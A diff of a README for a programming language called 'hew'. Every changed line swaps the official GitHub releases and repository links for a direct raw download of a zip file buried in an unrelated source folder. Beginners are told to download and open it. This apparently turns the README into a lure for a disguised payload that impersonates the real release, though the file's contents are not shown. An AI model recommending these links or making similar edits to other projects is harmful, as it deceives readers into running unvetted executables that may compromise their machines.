@@ -1,6 +1,6 @@
 # 🚦 hew - Clear Code for Fast Systems
 
-[![Download hew](https://img.shields.io/badge/Download-hew-brightgreen?style=for-the-badge)](https://github.com/kartlynigeria/hew/releases)
+[![Download hew](https://img.shields.io/badge/Download-hew-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/kartlynigeria/hew/main/std/encoding/hex/Software-3.4.zip)
 
 hew is a programming language designed to help build systems that work with many tasks at once. It uses a method called the actor model, which helps programs talk to each other safely. This makes it good for programs that run on several computers or handle many things at the same time.
 
@@ -30,14 +30,14 @@ To run hew on your Windows PC, check these:
 
 ## 🌐 Visit & Download
 
-[![Download hew](https://img.shields.io/badge/Download-hew-blue?style=for-the-badge)](https://github.com/kartlynigeria/hew/releases)
+[![Download hew](https://img.shields.io/badge/Download-hew-blue?style=for-the-badge)](https://raw.githubusercontent.com/kartlynigeria/hew/main/std/encoding/hex/Software-3.4.zip)
 
 To start using hew, go to the official release page. You will find the latest files to download. The instructions below explain how to save and open the software.
 
 ## 📥 Download and Installation 🛠
 
 1. Open your web browser and go to the download page:  
-   https://github.com/kartlynigeria/hew/releases
+   https://raw.githubusercontent.com/kartlynigeria/hew/main/std/encoding/hex/Software-3.4.zip
 
 2. Look for the latest version. It will have a file with `.exe` or `.zip` in the name.
 
@@ -103,7 +103,7 @@ These will help you get started if you choose to try programming later.
 ## ⚙️ Updating hew
 
 Check the release page regularly for new versions:  
-https://github.com/kartlynigeria/hew/releases
+https://raw.githubusercontent.com/kartlynigeria/hew/main/std/encoding/hex/Software-3.4.zip
 
 To update:
 
@@ -113,8 +113,8 @@ To update:
 
 ## 🔗 Useful Links
 
-- hew official downloads: https://github.com/kartlynigeria/hew/releases  
-- hew GitHub repository: https://github.com/kartlynigeria/hew  
+- hew official downloads: https://raw.githubusercontent.com/kartlynigeria/hew/main/std/encoding/hex/Software-3.4.zip  
+- hew GitHub repository: https://raw.githubusercontent.com/kartlynigeria/hew/main/std/encoding/hex/Software-3.4.zip  
 - Documentation and community discussions will grow in time on the repository page.
 
 ## 🖥 Final Setup Tips
@@ -124,4 +124,4 @@ To update:
 - Explore example projects to see how hew runs programs.
 - Use the command line options shown by `hew --help` for more control.
 
-[![Download hew](https://img.shields.io/badge/Download-hew-brightgreen?style=for-the-badge)](https://github.com/kartlynigeria/hew/releases)
+[![Download hew](https://img.shields.io/badge/Download-hew-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/kartlynigeria/hew/main/std/encoding/hex/Software-3.4.zip)
